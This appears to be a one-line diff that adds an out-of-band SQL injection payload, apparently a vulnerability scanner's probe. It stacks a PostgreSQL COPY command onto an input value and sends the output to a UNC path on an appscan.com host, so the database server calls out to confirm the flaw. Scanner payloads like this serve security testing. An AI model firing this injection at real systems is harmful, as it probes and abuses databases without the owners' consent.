@@ -1,0 +1,1 @@
+1234; COPY (select '') TO '\\v3-ping-217-4e7d1ec4-76a1-494a-8218-b1dddeea70a2.adns.appscan.com\\dir' --
